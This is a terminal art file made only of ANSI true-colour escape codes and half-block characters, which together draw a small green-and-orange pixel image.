

                     [48;2;194;194;194m[38;2;26;43;21m▄[48;2;159;158;159m[38;2;58;91;50m▄[48;2;130;130;130m[38;2;68;119;56m▄[48;2;116;117;116m[38;2;86;143;70m▄[48;2;98;98;98m[38;2;100;153;87m▄[48;2;63;65;63m[38;2;102;164;86m▄[48;2;46;49;44m[38;2;98;168;79m▄[48;2;43;45;43m[38;2;91;155;75m▄[48;2;61;62;61m[38;2;78;137;63m▄[48;2;102;101;102m[38;2;64;112;52m▄[48;2;134;134;134m[38;2;38;67;32m▄[48;2;164;164;164m[38;2;20;35;16m▄[48;2;188;187;188m[38;2;10;20;8m▄[48;2;223;223;223m[38;2;15;21;13m▄[0m
             [48;2;230;230;230m[38;2;49;80;41m▄[48;2;132;132;133m[38;2;73;133;59m▄[48;2;20;21;20m[38;2;91;163;72m▄[48;2;14;27;12m[38;2;96;174;76m▄[48;2;51;92;41m[38;2;98;177;78m▄[48;2;86;155;68m[38;2;98;177;78m▄[48;2;96;173;77m[38;2;98;177;78m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;178;78m[38;2;98;177;78m▄[48;2;97;175;76m[38;2;98;177;78m▄[48;2;93;168;74m[38;2;98;177;78m▄[48;2;99;163;83m[38;2;97;177;77m▄[48;2;99;151;86m[38;2;98;177;78m▄[48;2;35;57;29m[38;2;98;176;78m▄[48;2;19;21;19m[38;2;94;169;75m▄[48;2;118;118;118m[38;2;70;125;56m▄[48;2;234;234;234m[38;2;30;45;26m▄[0m
      [48;2;216;216;216m[38;2;42;65;36m▄[48;2;159;159;159m[38;2;62;106;52m▄[48;2;94;95;94m[38;2;86;152;70m▄[48;2;57;72;53m[38;2;96;174;77m▄[48;2;57;96;47m[38;2;98;177;78m▄[48;2;78;136;62m[38;2;98;177;78m▄[48;2;95;167;76m[38;2;98;177;78m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m[38;2;98;176;77m▄[48;2;98;177;78m[38;2;91;165;72m▄[48;2;98;177;78m[38;2;76;137;60m▄[48;2;98;177;78m[38;2;54;97;42m▄[48;2;99;179;79m[38;2;39;71;30m▄[48;2;100;181;79m[38;2;35;60;30m▄[48;2;101;181;81m[38;2;42;66;37m▄[48;2;100;177;80m[38;2;52;73;45m▄[48;2;95;175;76m[38;2;47;75;40m▄[48;2;94;178;73m[38;2;41;75;33m▄[48;2;98;179;78m[38;2;42;73;34m▄[48;2;99;180;79m[38;2;40;70;33m▄[48;2;99;179;78m[38;2;44;75;36m▄[48;2;97;177;77m[38;2;55;93;46m▄[48;2;97;176;77m[38;2;65;113;52m▄[48;2;98;177;78m[38;2;79;141;63m▄[48;2;98;177;78m[38;2;93;166;75m▄[48;2;98;177;78m[38;2;99;177;79m▄[48;2;98;177;78m[38;2;97;177;78m▄[48;2;98;177;78m[38;2;97;177;78m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;94;170;75m[38;2;98;177;78m▄[48;2;71;128;56m[38;2;98;177;78m▄[48;2;34;56;28m[38;2;97;175;77m▄[48;2;64;66;64m[38;2;78;140;62m▄[48;2;161;161;161m[38;2;48;84;39m▄[0m
  [48;2;66;112;54m[38;2;98;177;78m▄[48;2;80;133;66m[38;2;98;177;78m▄[48;2;95;162;76m[38;2;98;177;78m▄[48;2;96;171;76m[38;2;98;177;78m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m[38;2;98;176;78m▄[48;2;98;177;78m [48;2;98;177;78m[38;2;97;176;77m▄[48;2;98;177;78m[38;2;96;174;76m▄[48;2;98;177;78m[38;2;74;130;59m▄[48;2;98;176;78m[38;2;32;49;27m▄[48;2;95;166;76m[38;2;18;29;15m▄[48;2;73;126;59m[38;2;65;113;53m▄[48;2;40;62;34m[38;2;107;209;83m▄[48;2;23;43;19m[38;2;77;220;42m▄[48;2;32;72;22m[38;2;72;218;36m▄[48;2;55;155;30m[38;2;73;217;37m▄[48;2;71;203;38m[38;2;73;217;37m▄[48;2;79;212;46m[38;2;73;218;37m▄[48;2;81;216;48m[38;2;73;218;37m▄[48;2;82;220;48m[38;2;73;218;37m▄[48;2;79;221;44m[38;2;73;218;37m▄[48;2;76;219;40m[38;2;73;218;37m▄[48;2;76;218;40m[38;2;73;218;37m▄[48;2;75;213;41m[38;2;73;218;37m▄[48;2;79;203;48m[38;2;73;218;37m▄[48;2;76;175;52m[38;2;73;218;37m▄[48;2;52;127;33m[38;2;73;218;37m▄[48;2;29;75;18m[38;2;73;217;37m▄[48;2;19;45;12m[38;2;73;218;36m▄[48;2;45;74;38m[38;2;65;196;33m▄[48;2;76;127;62m[38;2;44;132;24m▄[48;2;90;158;72m[38;2;16;45;10m▄[48;2;97;175;77m[38;2;28;50;22m▄[48;2;98;177;78m[38;2;80;145;64m▄[48;2;98;177;78m[38;2;97;175;77m▄[48;2;98;177;78m[38;2;97;176;77m▄[48;2;98;177;78m [48;2;98;177;78m[38;2;98;176;78m▄[48;2;98;177;78m[38;2;98;177;77m▄[48;2;97;173;78m[38;2;98;177;78m▄[48;2;69;114;56m[38;2;98;177;78m▄[48;2;30;38;28m[38;2;103;179;83m▄[48;2;91;91;91m[38;2;99;149;87m▄[48;2;188;188;188m[38;2;39;53;36m▄[0m
  [48;2;98;177;78m[38;2;98;177;77m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m[38;2;98;178;78m▄[48;2;98;177;78m[38;2;98;178;78m▄[48;2;98;177;78m[38;2;83;150;66m▄[48;2;98;177;78m[38;2;44;80;34m▄[48;2;99;179;78m[38;2;33;49;28m▄[48;2;87;159;69m[38;2;68;97;61m▄[48;2;46;84;37m[38;2;87;165;68m▄[48;2;25;37;21m[38;2;83;208;52m▄[48;2;59;131;42m[38;2;73;219;37m▄[48;2;74;199;43m[38;2;74;223;37m▄[48;2;72;213;38m[38;2;67;204;35m▄[48;2;73;218;37m[38;2;55;171;29m▄[48;2;72;218;36m[38;2;59;136;22m▄[48;2;72;218;36m[38;2;103;132;15m▄[48;2;73;219;37m[38;2;149;133;9m▄[48;2;72;220;37m[38;2;168;130;7m▄[48;2;73;220;37m[38;2;167;118;5m▄[48;2;72;218;37m[38;2;106;78;4m▄[48;2;69;210;36m[38;2;93;69;4m▄[48;2;66;199;34m[38;2;173;117;4m▄[48;2;63;192;32m[38;2;177;119;4m▄[48;2;62;186;32m[38;2;173;116;4m▄[48;2;61;186;31m[38;2;176;115;4m▄[48;2;63;191;32m[38;2;174;115;4m▄[48;2;67;202;34m[38;2;170;113;4m▄[48;2;70;213;36m[38;2;180;118;3m▄[48;2;72;219;37m[38;2;175;117;4m▄[48;2;73;220;37m[38;2;154;120;7m▄[48;2;73;220;37m[38;2;80;94;11m▄[48;2;73;219;37m[38;2;48;93;15m▄[48;2;73;218;37m[38;2;41;112;19m▄[48;2;72;215;36m[38;2;45;144;25m▄[48;2;64;192;32m[38;2;63;191;32m▄[48;2;32;99;16m[38;2;73;218;37m▄[48;2;21;41;16m[38;2;72;210;38m▄[48;2;38;66;30m[38;2;67;177;41m▄[48;2;79;141;63m[38;2;53;123;36m▄[48;2;98;178;78m[38;2;32;57;25m▄[48;2;98;179;77m[38;2;25;46;20m▄[48;2;97;177;77m[38;2;56;100;46m▄[48;2;98;177;78m[38;2;93;165;75m▄[48;2;97;176;77m[38;2;100;181;80m▄[48;2;98;177;77m[38;2;97;176;76m▄[48;2;97;176;78m[38;2;98;177;78m▄[48;2;99;174;79m[38;2;98;177;78m▄[0m
  [48;2;98;178;78m[38;2;46;76;38m▄[48;2;100;178;80m[38;2;50;69;45m▄[48;2;99;176;80m[38;2;35;46;33m▄[48;2;82;148;65m[38;2;7;9;6m▄[48;2;64;117;50m[38;2;35;54;30m▄[48;2;42;77;34m[38;2;52;107;39m▄[48;2;26;46;21m[38;2;80;194;52m▄[48;2;34;71;26m[38;2;73;216;38m▄[48;2;54;133;35m[38;2;67;192;32m▄[48;2;81;199;52m[38;2;81;158;23m▄[48;2;80;218;46m[38;2;100;110;11m▄[48;2;66;199;33m[38;2;152;98;2m▄[48;2;60;157;26m[38;2;220;129;1m▄[48;2;80;128;18m[38;2;251;145;0m▄[48;2;120;110;9m[38;2;255;147;0m▄[48;2;154;106;4m[38;2;255;147;0m▄[48;2;181;114;2m[38;2;255;147;0m▄[48;2;230;134;0m[38;2;255;147;0m▄[48;2;251;144;0m[38;2;255;147;0m▄[48;2;254;146;0m[38;2;255;147;0m▄[48;2;255;147;0m [48;2;163;94;0m[38;2;134;78;0m▄[48;2;2;1;0m[38;2;58;33;0m▄[48;2;13;7;0m[38;2;133;76;0m▄[48;2;64;38;0m[38;2;12;7;0m▄[48;2;250;144;0m[38;2;234;135;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;249;146;0m[38;2;255;147;0m▄[48;2;239;143;2m[38;2;255;147;0m▄[48;2;223;131;1m[38;2;255;147;0m▄[48;2;192;120;2m[38;2;255;147;0m▄[48;2;130;96;5m[38;2;255;147;0m▄[48;2;82;88;9m[38;2;255;148;0m▄[48;2;62;104;15m[38;2;247;147;1m▄[48;2;49;132;22m[38;2;212;134;3m▄[48;2;57;165;32m[38;2;144;95;3m▄[48;2;53;117;38m[38;2;74;61;8m▄[48;2;50;97;39m[38;2;47;60;21m▄[48;2;35;56;29m[38;2;47;81;33m▄[48;2;17;22;15m[38;2;20;34;19m▄[48;2;31;50;26m[38;2;48;73;42m▄[48;2;55;90;47m[38;2;37;56;33m▄[48;2;78;132;64m[38;2;21;31;18m▄[48;2;95;167;78m[38;2;18;26;16m▄[0m
  [48;2;48;74;43m[38;2;51;78;45m▄[48;2;48;74;43m[38;2;50;76;44m▄[48;2;46;71;42m[38;2;12;17;11m▄[48;2;32;54;28m[38;2;45;93;35m▄[48;2;58;112;46m[38;2;26;45;17m▄[48;2;55;130;37m[38;2;121;83;5m▄[48;2;57;133;27m[38;2;232;138;0m▄[48;2;101;96;8m[38;2;253;146;0m▄[48;2;200;118;1m[38;2;254;147;0m▄[48;2;248;144;0m[38;2;255;147;0m▄[48;2;254;147;0m[38;2;255;147;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;173;100;0m[38;2;210;122;0m▄[48;2;172;100;0m[38;2;76;44;0m▄[48;2;214;123;0m[38;2;153;88;0m▄[48;2;36;21;0m[38;2;162;94;0m▄[48;2;201;116;0m[38;2;20;12;0m▄[48;2;254;147;0m[38;2;238;137;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;254;147;0m[38;2;255;147;0m▄[48;2;241;143;1m[38;2;255;147;0m▄[48;2;213;125;0m[38;2;255;147;0m▄[48;2;117;73;3m[38;2;252;147;1m▄[48;2;25;36;21m[38;2;94;69;18m▄[48;2;50;77;44m[38;2;39;59;33m▄[48;2;51;78;45m [48;2;51;78;44m[38;2;51;78;45m▄[0m
  [48;2;51;78;45m[38;2;50;76;44m▄[48;2;40;58;34m[38;2;43;36;13m▄[48;2;38;37;6m[38;2;240;143;2m▄[48;2;149;95;6m[38;2;254;147;0m▄[48;2;226;134;1m[38;2;255;147;0m▄[48;2;253;146;0m[38;2;255;147;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m[38;2;243;140;0m▄[48;2;116;67;0m[38;2;90;52;0m▄[48;2;237;137;0m[38;2;254;147;0m▄[48;2;248;143;0m[38;2;255;147;0m▄[48;2;250;144;0m[38;2;255;147;0m▄[48;2;45;25;0m[38;2;191;110;0m▄[48;2;64;36;0m[38;2;32;18;0m▄[48;2;245;141;0m[38;2;152;87;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;254;147;0m[38;2;255;147;0m▄[48;2;230;140;6m[38;2;254;147;0m▄[48;2;25;21;7m[38;2;143;86;2m▄[48;2;48;74;42m[38;2;39;60;34m▄[48;2;51;78;45m [0m
  [48;2;41;63;37m[38;2;40;47;23m▄[48;2;119;70;1m[38;2;230;135;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;180;104;0m[38;2;120;68;0m▄[48;2;135;78;0m[38;2;158;91;0m▄[48;2;255;147;0m[38;2;250;145;0m▄[48;2;255;147;0m [48;2;255;147;0m[38;2;254;146;0m▄[48;2;252;145;0m[38;2;209;120;0m▄[48;2;54;31;0m[38;2;61;35;0m▄[48;2;94;54;0m[38;2;159;91;0m▄[48;2;254;146;0m[38;2;244;140;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;240;144;1m[38;2;255;147;0m▄[48;2;36;40;18m[38;2;70;49;6m▄[48;2;50;78;45m[38;2;45;69;40m▄[0m
  [48;2;65;48;9m[38;2;98;64;6m▄[48;2;255;149;0m[38;2;255;147;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;254;147;0m[38;2;254;146;0m▄[48;2;225;130;0m[38;2;175;100;0m▄[48;2;210;120;0m[38;2;253;146;0m▄[48;2;209;121;0m[38;2;254;147;0m▄[48;2;86;49;0m[38;2;189;109;0m▄[48;2;254;146;0m[38;2;142;81;0m▄[48;2;255;147;0m[38;2;102;59;0m▄[48;2;199;115;0m[38;2;69;40;0m▄[48;2;244;141;0m[38;2;238;138;0m▄[48;2;253;146;0m[38;2;184;105;0m▄[48;2;200;115;0m[38;2;231;134;0m▄[48;2;253;147;0m[38;2;254;146;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;149;98;7m[38;2;215;132;5m▄[48;2;35;54;32m[38;2;31;42;22m▄[0m
  [48;2;133;82;3m[38;2;153;89;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m[38;2;255;146;0m▄[48;2;255;147;0m[38;2;255;146;0m▄[48;2;255;147;0m [48;2;255;147;0m[38;2;254;148;0m▄[48;2;255;147;0m[38;2;248;147;0m▄[48;2;254;147;0m[38;2;242;142;0m▄[48;2;204;116;0m[38;2;224;131;0m▄[48;2;200;115;0m[38;2;205;124;1m▄[48;2;199;115;0m[38;2;175;109;2m▄[48;2;172;100;0m[38;2;157;102;2m▄[48;2;168;97;0m[38;2;172;114;3m▄[48;2;206;119;0m[38;2;156;115;5m▄[48;2;215;125;0m[38;2;138;111;7m▄[48;2;180;105;0m[38;2;121;105;8m▄[48;2;233;136;0m[38;2;120;109;8m▄[48;2;254;148;0m[38;2;116;111;9m▄[48;2;254;148;0m[38;2;112;111;10m▄[48;2;255;148;0m[38;2;130;121;10m▄[48;2;254;148;0m[38;2;103;105;10m▄[48;2;254;148;0m[38;2;99;99;9m▄[48;2;254;148;0m[38;2;106;98;8m▄[48;2;254;148;0m[38;2;106;96;8m▄[48;2;255;148;0m[38;2;118;98;7m▄[48;2;255;147;0m[38;2;123;101;7m▄[48;2;255;147;0m[38;2;129;99;6m▄[48;2;255;147;0m[38;2;141;100;5m▄[48;2;255;147;0m[38;2;166;111;4m▄[48;2;255;147;0m[38;2;189;122;4m▄[48;2;255;147;0m[38;2;217;131;1m▄[48;2;255;147;0m[38;2;248;145;0m▄[48;2;255;147;0m[38;2;250;148;0m▄[48;2;255;147;0m[38;2;254;149;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;249;147;1m[38;2;254;147;0m▄[48;2;47;44;15m[38;2;81;54;7m▄[0m
  [48;2;163;95;0m[38;2;176;103;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m[38;2;254;147;0m▄[48;2;255;147;0m[38;2;250;144;0m▄[48;2;255;147;0m[38;2;238;146;1m▄[48;2;254;147;0m[38;2;170;117;4m▄[48;2;252;147;0m[38;2;78;65;5m▄[48;2;239;144;1m[38;2;36;71;11m▄[48;2;220;136;2m[38;2;41;122;21m▄[48;2;193;124;2m[38;2;59;179;31m▄[48;2;178;119;4m[38;2;69;210;35m▄[48;2;129;104;6m[38;2;73;219;37m▄[48;2;67;87;10m[38;2;73;219;37m▄[48;2;61;106;15m[38;2;73;218;37m▄[48;2;52;126;21m[38;2;73;218;37m▄[48;2;52;150;25m[38;2;73;218;37m▄[48;2;58;177;30m[38;2;73;218;37m▄[48;2;63;194;33m[38;2;73;218;37m▄[48;2;66;204;34m[38;2;73;218;37m▄[48;2;69;212;36m[38;2;73;218;37m▄[48;2;72;217;36m[38;2;73;218;37m▄[48;2;72;219;37m[38;2;73;218;37m▄[48;2;73;220;37m[38;2;73;218;37m▄[48;2;73;220;37m[38;2;73;218;37m▄[48;2;73;220;37m[38;2;73;218;37m▄[48;2;73;220;37m[38;2;73;218;37m▄[48;2;73;220;37m[38;2;73;218;37m▄[48;2;74;220;37m[38;2;73;218;37m▄[48;2;73;220;37m[38;2;73;218;37m▄[48;2;73;219;37m[38;2;73;218;37m▄[48;2;72;214;36m[38;2;73;218;37m▄[48;2;68;207;35m[38;2;73;218;37m▄[48;2;65;197;34m[38;2;73;218;37m▄[48;2;61;185;32m[38;2;73;218;37m▄[48;2;51;157;27m[38;2;73;218;37m▄[48;2;41;125;21m[38;2;73;218;37m▄[48;2;40;106;18m[38;2;73;218;37m▄[48;2;75;92;10m[38;2;73;218;37m▄[48;2;76;85;10m[38;2;73;219;37m▄[48;2;112;94;7m[38;2;72;216;36m▄[48;2;162;113;5m[38;2;64;194;33m▄[48;2;219;131;0m[38;2;50;152;26m▄[48;2;231;138;1m[38;2;30;65;14m▄[48;2;252;147;0m[38;2;106;71;5m▄[48;2;97;61;4m[38;2;30;31;7m▄[0m
  [48;2;186;108;0m[38;2;185;108;0m▄[48;2;255;147;0m[38;2;254;148;0m▄[48;2;255;147;0m[38;2;247;144;0m▄[48;2;255;147;0m[38;2;188;113;1m▄[48;2;255;147;0m[38;2;110;100;8m▄[48;2;248;147;0m[38;2;72;136;20m▄[48;2;206;124;1m[38;2;62;175;29m▄[48;2;115;81;4m[38;2;67;204;34m▄[48;2;55;92;13m[38;2;72;217;36m▄[48;2;60;157;26m[38;2;73;218;37m▄[48;2;66;195;32m[38;2;73;218;37m▄[48;2;70;212;35m[38;2;73;218;37m▄[48;2;72;215;36m[38;2;73;218;37m▄[48;2;73;217;36m[38;2;73;218;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;71;210;37m[38;2;71;214;37m▄[48;2;58;142;37m[38;2;57;136;37m▄[48;2;51;109;39m[38;2;54;109;40m▄[48;2;36;76;26m[38;2;38;71;31m▄[0m
  [48;2;73;63;12m[38;2;24;46;20m▄[48;2;89;67;7m[38;2;54;120;38m▄[48;2;67;119;19m[38;2;66;192;35m▄[48;2;61;177;29m[38;2;73;217;37m▄[48;2;71;213;36m[38;2;73;218;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;71;214;35m[38;2;42;129;21m▄[48;2;43;131;22m[38;2;4;10;2m▄[48;2;37;111;19m[38;2;4;10;2m▄[48;2;60;180;30m[38;2;7;22;3m▄[48;2;73;218;37m[38;2;62;187;31m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m[38;2;72;217;36m▄[48;2;69;208;35m[38;2;20;61;10m▄[48;2;43;129;22m[38;2;4;11;2m▄[48;2;38;116;19m[38;2;3;8;1m▄[48;2;64;192;32m[38;2;19;57;10m▄[48;2;73;218;37m[38;2;73;219;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;72;214;36m[38;2;71;213;36m▄[48;2;55;130;37m[38;2;55;123;38m▄[48;2;54;108;41m[38;2;56;110;44m▄[48;2;35;60;30m[38;2;35;57;30m▄[0m
  [48;2;37;68;29m[38;2;38;61;33m▄[48;2;58;132;39m[38;2;62;134;45m▄[48;2;64;179;36m[38;2;55;129;37m▄[48;2;72;217;36m[38;2;71;210;36m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;27;82;14m[38;2;59;178;30m▄[48;2;4;11;3m[38;2;3;9;1m▄[48;2;0;0;0m[38;2;8;18;4m▄[48;2;1;3;1m[38;2;4;12;2m▄[48;2;36;112;19m[38;2;54;163;27m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;70;210;36m[38;2;72;217;36m▄[48;2;4;11;1m[38;2;9;28;4m▄[48;2;0;0;0m[38;2;6;16;3m▄[48;2;1;3;1m[38;2;6;15;3m▄[48;2;13;39;6m[38;2;32;94;15m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;70;207;36m[38;2;67;196;36m▄[48;2;52;110;38m [48;2;57;101;47m[38;2;56;90;47m▄[48;2;36;55;31m[38;2;38;58;33m▄[0m
  [48;2;40;63;35m[38;2;43;67;38m▄[48;2;61;117;48m[38;2;45;80;38m▄[48;2;54;114;39m[38;2;52;110;38m▄[48;2;64;177;36m[38;2;59;150;37m▄[48;2;72;217;36m[38;2;72;214;36m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;72;217;36m[38;2;73;218;37m▄[48;2;61;182;30m[38;2;73;218;37m▄[48;2;45;135;22m[38;2;73;218;37m▄[48;2;58;174;29m[38;2;73;218;37m▄[48;2;72;217;36m[38;2;73;218;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;71;212;35m[38;2;72;216;36m▄[48;2;34;101;17m[38;2;11;32;5m▄[48;2;34;101;17m[38;2;1;2;1m▄[48;2;34;98;18m[38;2;1;3;1m▄[48;2;35;101;18m[38;2;1;1;1m▄[48;2;35;100;17m[38;2;1;3;1m▄[48;2;57;170;29m[38;2;56;168;28m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;72;217;36m[38;2;72;218;36m▄[48;2;66;197;33m[38;2;72;217;36m▄[48;2;46;139;23m[38;2;73;217;37m▄[48;2;54;163;27m[38;2;72;217;37m▄[48;2;71;212;36m[38;2;72;217;36m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;72;217;37m[38;2;70;204;36m▄[48;2;60;158;37m[38;2;53;122;37m▄[48;2;52;103;38m[38;2;52;104;40m▄[48;2;33;54;28m[38;2;21;34;18m▄[48;2;46;70;41m[38;2;49;76;44m▄[0m
  [48;2;49;76;44m[38;2;51;78;45m▄[48;2;32;51;28m[38;2;43;65;37m▄[48;2;61;125;45m[38;2;81;124;71m▄[48;2;54;124;38m[38;2;53;113;40m▄[48;2;68;202;36m[38;2;60;156;37m▄[48;2;73;218;37m[38;2;72;215;36m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m[38;2;73;216;37m▄[48;2;73;217;37m[38;2;93;205;61m▄[48;2;79;213;44m[38;2;121;189;95m▄[48;2;85;210;51m[38;2;132;184;108m▄[48;2;82;211;47m[38;2;121;191;93m▄[48;2;73;217;37m[38;2;85;210;52m▄[48;2;73;218;37m[38;2;73;217;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;37;111;20m[38;2;71;214;36m▄[48;2;1;2;0m[38;2;44;128;22m▄[48;2;2;4;2m[38;2;15;39;8m▄[48;2;1;1;1m[38;2;29;82;14m▄[48;2;13;37;7m[38;2;68;204;34m▄[48;2;70;210;35m[38;2;73;218;37m▄[48;2;73;217;37m[38;2;73;218;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;217;37m[38;2;74;216;38m▄[48;2;82;211;47m[38;2;118;191;90m▄[48;2;100;200;70m[38;2;132;185;108m▄[48;2;103;201;72m[38;2;127;187;101m▄[48;2;98;203;67m[38;2;125;189;100m▄[48;2;85;209;52m[38;2;116;192;88m▄[48;2;73;217;37m[38;2;80;211;44m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;72;217;36m[38;2;68;200;35m▄[48;2;63;170;35m[38;2;54;125;36m▄[48;2;51;103;38m[38;2;51;99;38m▄[48;2;49;101;36m[38;2;22;45;17m▄[48;2;30;47;26m[38;2;45;69;39m▄[48;2;51;78;45m [0m
